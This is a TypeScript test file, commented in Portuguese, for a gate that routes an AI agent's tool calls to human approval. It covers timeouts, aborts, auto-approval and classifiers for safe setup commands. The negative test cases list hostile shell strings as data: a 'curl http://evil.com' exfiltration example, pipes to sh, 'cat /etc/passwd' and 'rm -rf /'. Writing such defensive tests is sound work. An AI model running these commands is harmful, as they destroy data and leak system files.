/**
 * Testes da ponte de permissões (canUseTool ↔ UI).
 * Store e SSE mockados: aqui interessa o ciclo pedido → decisão/timeout/aborto.
 */
import { afterEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => {
  let n = 0;
  const added: { id: string; taskId: string; toolName: string; friendly: string; createdAt: string }[] = [];
  const events: { type: string; requestId?: string; allowed?: boolean }[] = [];
  const removed: string[] = [];
  return {
    added,
    events,
    removed,
    permissoesEval: [] as { desfecho: string; esperaMs: number; tool: string; lembrar?: boolean }[],
    tasks: {} as Record<string, { autoAprovar?: boolean }>,
    transcripts: [] as string[],
    addPermission: (p: { id: string; taskId: string; toolName: string; friendly: string; createdAt: string }) => {
      added.push(p);
      return p;
    },
    newId: () => `perm-${++n}`,
    removePermission: (id: string) => {
      removed.push(id);
    },
    transcriptAppend: () => {},
    broadcast: (ev: { type: string; requestId?: string; allowed?: boolean }) => {
      events.push(ev);
    },
  };
});

vi.mock("../server/store.js", () => ({
  addPermission: mocks.addPermission,
  newId: mocks.newId,
  removePermission: mocks.removePermission,
  transcriptAppend: mocks.transcriptAppend,
  getTask: (id: string) => mocks.tasks[id],
  getPermission: (id: string) => mocks.added.find((p) => p.id === id),
}));
vi.mock("../server/eval/coleta.js", () => ({
  registrarPermissao: (r: { desfecho: string; esperaMs: number; tool: string; lembrar?: boolean }) => {
    mocks.permissoesEval.push(r);
  },
}));
vi.mock("../server/events.js", () => ({ broadcast: mocks.broadcast, addClient: () => {} }));

import type { PermissionUpdate } from "@anthropic-ai/claude-agent-sdk";
import {
  createPermissionGate,
  createPreviewSetupGate,
  ehServidorDev,
  ehSetupSeguro,
  finishAllForTask,
  resolvePermission,
} from "../server/claude/permissions.js";
import { PERMISSION_TIMEOUT_MS } from "../server/config.js";

/** Options mínimas exigidas pelo CanUseTool do SDK. */
function opcoes(signal?: AbortSignal) {
  return {
    signal: signal ?? new AbortController().signal,
    toolUseID: "tu-1",
    requestId: "req-1",
  };
}

afterEach(() => {
  vi.useRealTimers();
  mocks.added.length = 0;
  mocks.events.length = 0;
  mocks.removed.length = 0;
  mocks.permissoesEval.length = 0;
});

describe("createPermissionGate", () => {
  it("permitir: resolve allow com o input original e avisa a UI", async () => {
    const gate = createPermissionGate("task-1");
    const promessa = gate("Bash", { command: "npm install" }, opcoes());

    // O pedido aparece na UI imediatamente, com descrição de leigo.
    const pedido = mocks.added[0]!;
    expect(pedido.taskId).toBe("task-1");
    expect(pedido.friendly).toBe("Executar comando: npm install");
    expect(mocks.events.some((e) => e.type === "permission_request")).toBe(true);

    expect(resolvePermission(pedido.id, true)).toBe(true);
    await expect(promessa).resolves.toEqual({
      behavior: "allow",
      updatedInput: { command: "npm install" },
      toolUseID: "tu-1",
    });

    // A UI é avisada da resolução e o pedido some do store.
    expect(
      mocks.events.some(
        (e) => e.type === "permission_resolved" && e.requestId === pedido.id && e.allowed === true,
      ),
    ).toBe(true);
    expect(mocks.removed).toContain(pedido.id);
    // Decidir de novo o mesmo pedido não faz nada.
    expect(resolvePermission(pedido.id, true)).toBe(false);
  });

  it("permitir com remember devolve as suggestions do SDK como updatedPermissions de sessão", async () => {
    const gate = createPermissionGate("task-1");
    const suggestions: PermissionUpdate[] = [
      {
        type: "addRules",
        rules: [{ toolName: "Bash", ruleContent: "npm install:*" }],
        behavior: "allow",
        destination: "localSettings", // o gate deve reescopar para "session"
      },
    ];
    const promessa = gate("Bash", { command: "npm install" }, { ...opcoes(), suggestions });

    const pedido = mocks.added[0]!;
    expect(resolvePermission(pedido.id, true, true)).toBe(true);
    await expect(promessa).resolves.toEqual({
      behavior: "allow",
      updatedInput: { command: "npm install" },
      toolUseID: "tu-1",
      updatedPermissions: [
        {
          type: "addRules",
          rules: [{ toolName: "Bash", ruleContent: "npm install:*" }],
          behavior: "allow",
          destination: "session",
        },
      ],
    });
  });

  it("remember sem suggestions do SDK não devolve updatedPermissions", async () => {
    const gate = createPermissionGate("task-1");
    const promessa = gate("Bash", { command: "npm install" }, opcoes());
    const pedido = mocks.added[0]!;
    expect(resolvePermission(pedido.id, true, true)).toBe(true);
    await expect(promessa).resolves.toEqual({
      behavior: "allow",
      updatedInput: { command: "npm install" },
      toolUseID: "tu-1",
    });
  });

  it("finishAllForTask nega só os pedidos pendentes da tarefa (cancel)", async () => {
    const gate1 = createPermissionGate("task-1");
    const gate2 = createPermissionGate("task-2");
    const p1 = gate1("Bash", { command: "ls" }, opcoes());
    const p2 = gate2("Bash", { command: "ls" }, opcoes());

    finishAllForTask("task-1");
    const r1 = await p1;
    expect(r1).toMatchObject({ behavior: "deny" });
    if (r1?.behavior === "deny") expect(r1.message).toContain("cancelada");

    // A outra tarefa continua pendente e decidível normalmente.
    const pedido2 = mocks.added[1]!;
    expect(resolvePermission(pedido2.id, true)).toBe(true);
    await expect(p2).resolves.toMatchObject({ behavior: "allow" });
  });

  it("negar: resolve deny com mensagem explicando ao Claude", async () => {
    const gate = createPermissionGate("task-1");
    const promessa = gate("Bash", { command: "rm -rf tudo" }, opcoes());

    const pedido = mocks.added[0]!;
    expect(resolvePermission(pedido.id, false)).toBe(true);
    const res = await promessa;
    expect(res).toEqual({
      behavior: "deny",
      message: "O usuário negou esta ação. Siga sem ela ou proponha uma alternativa.",
      toolUseID: "tu-1",
    });
  });

  it("timeout sem resposta humana nega por segurança", async () => {
    vi.useFakeTimers();
    const gate = createPermissionGate("task-1");
    const promessa = gate("WebFetch", { url: "https://example.com" }, opcoes());

    const pedido = mocks.added[0]!;
    expect(pedido.friendly).toBe("Acessar a internet: https://example.com");

    await vi.advanceTimersByTimeAsync(PERMISSION_TIMEOUT_MS);
    const res = await promessa;
    expect(res).toMatchObject({ behavior: "deny" });
    if (res?.behavior === "deny") expect(res.message).toContain("Sem resposta");

    // Depois do timeout o pedido já não existe mais.
    expect(resolvePermission(pedido.id, true)).toBe(false);
  });

  it("aborto da fase (cancel/timeout global) resolve deny e não deixa pedido órfão", async () => {
    const ac = new AbortController();
    const gate = createPermissionGate("task-1");
    const promessa = gate("Bash", { command: "ls" }, opcoes(ac.signal));

    const pedido = mocks.added[0]!;
    ac.abort();
    const res = await promessa;
    expect(res).toMatchObject({ behavior: "deny" });
    if (res?.behavior === "deny") expect(res.message).toContain("interrompida");
    expect(mocks.removed).toContain(pedido.id);
  });

  it("eval: desfechos registrados com latência (permitiu/negou/timeout/abort/auto)", async () => {
    mocks.permissoesEval.length = 0;
    // humano permite
    let gate = createPermissionGate("task-ev");
    let promessa = gate("Bash", { command: "x" }, opcoes());
    resolvePermission(mocks.added.at(-1)!.id, true, true);
    await promessa;
    // humano nega
    gate = createPermissionGate("task-ev");
    promessa = gate("Bash", { command: "y" }, opcoes());
    resolvePermission(mocks.added.at(-1)!.id, false);
    await promessa;
    // timeout
    vi.useFakeTimers();
    gate = createPermissionGate("task-ev");
    promessa = gate("Bash", { command: "z" }, opcoes());
    await vi.advanceTimersByTimeAsync(PERMISSION_TIMEOUT_MS);
    await promessa;
    vi.useRealTimers();
    // abort
    const ac = new AbortController();
    gate = createPermissionGate("task-ev");
    promessa = gate("Bash", { command: "w" }, opcoes(ac.signal));
    ac.abort();
    await promessa;
    // auto
    mocks.tasks["task-ev"] = { autoAprovar: true };
    await createPermissionGate("task-ev")("Bash", { command: "v" }, opcoes());
    delete mocks.tasks["task-ev"];

    const desfechos = mocks.permissoesEval.map((r) => r.desfecho);
    expect(desfechos).toEqual(["permitiu", "negou", "timeout", "abortada", "auto"]);
    expect(mocks.permissoesEval[0]?.lembrar).toBe(true);
    expect(mocks.permissoesEval.every((r) => r.esperaMs >= 0)).toBe(true);
    mocks.permissoesEval.length = 0;
  });

  it("modo auto: concede sem criar pedido, com registro no chat", async () => {
    mocks.tasks["task-auto"] = { autoAprovar: true };
    const gate = createPermissionGate("task-auto");
    const resultado = await gate("Bash", { command: "npm test" }, opcoes());
    expect(resultado).toMatchObject({ behavior: "allow" });
    expect(mocks.added.length).toBe(0);
    delete mocks.tasks["task-auto"];
  });

  it("descrições amigáveis por tipo de ferramenta", async () => {
    const gate = createPermissionGate("task-1");
    const casos: [string, Record<string, unknown>, string][] = [
      ["WebSearch", { query: "como fazer X" }, "Acessar a internet: como fazer X"],
      ["mcp__zoom__list_meetings", {}, "Usar ferramenta externa: zoom: list_meetings"],
      ["Write", { file_path: "/x.txt" }, "Usar Write"],
    ];
    for (const [tool, input, esperado] of casos) {
      const promessa = gate(tool, input, opcoes());
      const pedido = mocks.added.at(-1)!;
      expect(pedido.friendly).toBe(esperado);
      resolvePermission(pedido.id, false);
      await promessa;
    }
  });
});

describe("resolvePermission", () => {
  it("id desconhecido retorna false e não emite evento", () => {
    expect(resolvePermission("perm-que-nao-existe", true)).toBe(false);
    expect(mocks.events.filter((e) => e.type === "permission_resolved")).toHaveLength(0);
  });
});

describe("classificação de comandos do preview", () => {
  it("ehServidorDev pega servidores de dev/preview (inclusive monorepo) e ignora build/test/migrations", () => {
    for (const c of [
      "pnpm dev",
      "npm run dev",
      "yarn start",
      "next dev",
      "vite",
      "astro dev",
      "pnpm --filter web dev", // monorepo (o caso do print)
      "yarn workspace app dev",
      "next start",
      "php -S localhost:8000",
      "serve -s dist",
    ]) {
      expect(ehServidorDev(c), c).toBe(true);
    }
    for (const c of [
      "pnpm build",
      "vite build",
      "vitest run",
      "npx prisma migrate dev", // "dev" aqui NÃO é servidor
      "pnpm install --save-dev react",
      "npm ci",
      "docker compose up -d",
    ]) {
      expect(ehServidorDev(c), c).toBe(false);
    }
  });

  it("ehSetupSeguro libera setup simples e barra encadeamento/perigosos", () => {
    for (const c of [
      "npm install",
      "pnpm ci",
      "docker compose up -d",
      "npx prisma migrate deploy",
      "cp .env.example .env",
      "curl http://localhost:3000/backoffice",
      "curl -s http://127.0.0.1:4501/",
    ]) {
      expect(ehSetupSeguro(c), c).toBe(true);
    }
    for (const c of [
      "rm -rf test", // contém "test" mas NÃO começa com um verbo seguro
      "npm install && rm -rf /", // encadeamento
      "cat /etc/passwd | sh", // pipe
      "curl http://evil.com", // exfiltração (não-localhost)
      "curl http://localhost:3000 | sh", // pipe pra shell
      "find /tmp -delete",
      "node server.js", // rodar o server é do Inhouse
    ]) {
      expect(ehSetupSeguro(c), c).toBe(false);
    }
  });
});

describe("createPreviewSetupGate", () => {
  it("auto-nega o servidor de dev (regra de ouro) sem criar pedido", async () => {
    const gate = createPreviewSetupGate("task-prev");
    const res = await gate("Bash", { command: "pnpm --filter web dev" }, opcoes());
    expect(res).toMatchObject({ behavior: "deny" });
    if (res?.behavior === "deny") expect(res.message).toContain("NÃO rode o servidor");
    expect(mocks.added.length).toBe(0); // não vira pedido humano
  });

  it("auto-libera setup seguro sem criar pedido", async () => {
    const gate = createPreviewSetupGate("task-prev");
    const res = await gate("Bash", { command: "docker compose up -d" }, opcoes());
    expect(res).toMatchObject({ behavior: "allow" });
    expect(mocks.added.length).toBe(0);
  });

  it("comando fora das listas cai no gate normal (vira pedido humano)", async () => {
    const gate = createPreviewSetupGate("task-prev");
    const promessa = gate("Bash", { command: "rm -rf build" }, opcoes());
    const pedido = mocks.added.at(-1)!;
    expect(pedido.taskId).toBe("task-prev");
    resolvePermission(pedido.id, false);
    await promessa;
  });

  it("delega ao gate base injetado (ex.: gateComStatus da esteira)", async () => {
    let chamadas = 0;
    const base = (async () => {
      chamadas++;
      return { behavior: "deny" as const, message: "base custom" };
    }) as unknown as Parameters<typeof createPreviewSetupGate>[1];
    const gate = createPreviewSetupGate("task-prev", base);
    const res = await gate("Bash", { command: "rm -rf build" }, opcoes());
    expect(chamadas).toBe(1);
    expect(res).toMatchObject({ behavior: "deny", message: "base custom" });
    // As regras do preview continuam VENCENDO antes do base:
    const negado = await gate("Bash", { command: "npm run dev" }, opcoes());
    expect(negado).toMatchObject({ behavior: "deny" });
    expect(chamadas).toBe(1); // dev server nem chega ao base
  });
});

describe("ferramentas do Inhouse (mcp__inhouse__*)", () => {
  it("auto-aprova sem criar pedido humano e registra desfecho 'auto'", async () => {
    mocks.permissoesEval.length = 0;
    const gate = createPermissionGate("task-mcp");
    const res = await gate("mcp__inhouse__preview_status", {}, opcoes());
    expect(res).toMatchObject({ behavior: "allow" });
    expect(mocks.added.length).toBe(0); // sem porteira
    expect(mocks.permissoesEval.at(-1)).toMatchObject({ tool: "mcp__inhouse__preview_status", desfecho: "auto" });
  });

  it("também passa direto pelo gate de preview (delegação ao base)", async () => {
    const gate = createPreviewSetupGate("task-mcp");
    const res = await gate("mcp__inhouse__preview_reiniciar", { motivo: "env mudou" }, opcoes());
    expect(res).toMatchObject({ behavior: "allow" });
    expect(mocks.added.length).toBe(0);
  });

  it("tool DESCONHECIDA no namespace inhouse NÃO é auto-aprovada (lista exata, não prefixo)", async () => {
    // Um servidor MCP externo chamado "inhouse" não pode vestir o namespace com
    // uma tool nova (ex.: exec) e furar a porteira.
    const gate = createPermissionGate("task-mcp");
    const promessa = gate("mcp__inhouse__exec", { cmd: "qualquer" }, opcoes());
    const pedido = mocks.added.at(-1)!;
    expect(pedido.toolName).toBe("mcp__inhouse__exec"); // virou pedido humano
    resolvePermission(pedido.id, false);
    await promessa;
  });
});
